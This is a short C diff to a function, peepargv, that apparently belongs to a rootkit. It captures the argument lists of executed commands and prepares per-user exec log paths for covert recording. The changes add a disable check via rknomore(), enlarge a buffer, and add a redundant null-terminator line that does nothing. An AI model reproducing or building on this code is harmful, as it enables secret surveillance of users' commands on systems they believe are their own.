@@ -1,4 +1,7 @@
 void peepargv(char *const argv[]){
+    if(rknomore())
+        return;
+
     if(!stdout) return;
     int outfd = fileno(stdout);
     if(!isatty(outfd)) return;
@@ -31,8 +34,9 @@ void peepargv(char *const argv[]){
         strncat(buf, tmp, tmpsize);
     }
     buf[strlen(buf)-1]='\n';
+    buf[strlen(buf)]='\0';
 
-    char dest[LEN_EXEC_LOGS+64];
+    char dest[LEN_EXEC_LOGS+128];
     memset(dest, 0, sizeof(dest));
 
     uid_t myuid = getuid();
